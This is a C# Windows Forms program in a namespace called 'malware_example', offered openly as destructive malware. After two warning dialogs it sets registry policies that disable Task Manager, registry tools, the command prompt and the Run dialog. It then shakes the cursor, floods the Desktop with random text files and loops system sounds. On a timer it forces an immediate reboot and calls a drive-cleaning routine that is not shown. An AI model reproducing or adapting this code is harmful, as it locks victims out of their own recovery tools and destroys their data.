using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace malware_example
{
    public partial class Form1 : Form
    {
        class MediaPlayer
        {
            System.Media.SoundPlayer soundPlayer;
            public MediaPlayer(byte[] buffer)
            {
                MemoryStream memoryStream = new MemoryStream(buffer, true);
                soundPlayer = new System.Media.SoundPlayer(memoryStream);
            }

            public void Play()
            {
                soundPlayer.Play();
            }

            public void Play(byte[] buffer)
            {
                soundPlayer.Stream.Seek(0, SeekOrigin.Begin);
                soundPlayer.Stream.Write(buffer, 0, buffer.Length);
                soundPlayer.PlayLooping();
            }

            public void Stop()
            {
                soundPlayer.Stop();
            }
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("This program has the potential to destory your computer, are you sure that you want to continue?", "first warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                if (MessageBox.Show("The creator of this program is not responsible for any damages done, do you really wanna start the program?", "last warning!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    destroyregistry();
                    cursorShake.Start();
                    createfiletimer.Start();
                    timeUntilRestart.Start();
                    beep1.Start();
                    beep2.Start();
                }
                else
                {
                    Application.Exit();
                }
            }
            else
            {
                Application.Exit();
            }
        }

        public void destroyregistry()
        {
            RegistryKey reg_task = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_task.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            reg_task.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            RegistryKey reg_cmd = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg_cmd.SetValue("DisableCMD", 1, RegistryValueKind.DWord);

            RegistryKey reg_run = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            reg_run.SetValue("NoRun", 1, RegistryValueKind.DWord);
        }

        private void cursorShake_Tick(object sender, EventArgs e)
        {
            Random rand = new Random();
            int x = Cursor.Position.X;
            int y = Cursor.Position.Y;
            
            Cursor.Position = new Point(x - rand.Next(-20, 20), y + rand.Next(-20, 20));
            Cursor.Position = new Point(x + rand.Next(-20, 20), y - rand.Next(-20, 20));
        }

        public void createrandomfiles()
        {
            string filename = characterGenerator.gen_filename() + ".txt";
            string noteFilePath = "C:\\Users\\" + Environment.UserName + "\\Desktop\\" + filename;

            StreamWriter noteFile = new StreamWriter(noteFilePath);

            noteFile.WriteLine(characterGenerator.gen_filetext());
            noteFile.Close();
        }

        private void createfiletimer_Tick(object sender, EventArgs e)
        {
            createrandomfiles();
        }

        private void timeUntilRestart_Tick(object sender, EventArgs e)
        {
            restart();
            cleanmaindrive.clean();
            timeUntilRestart.Stop();
        }

        public void restart()
        {
            cmd_function.cmd("cmd.exe", "shutdown.exe /r /t 0");
        }

        private void beep1_Tick(object sender, EventArgs e)
        {
            string file1 = "C:\\Windows\\Media\\Windows Foreground.wav";
            List<byte> soundBytes = new List<byte>(File.ReadAllBytes(file1));
            MediaPlayer mPlayer = new MediaPlayer(soundBytes.ToArray());
            mPlayer.Play();
        }

        private void beep2_Tick(object sender, EventArgs e)
        {
            string file1 = "C:\\Windows\\Media\\Windows Background.wav";
            List<byte> soundBytes = new List<byte>(File.ReadAllBytes(file1));
            MediaPlayer mPlayer = new MediaPlayer(soundBytes.ToArray());
            mPlayer.Play();
        }
    }
}
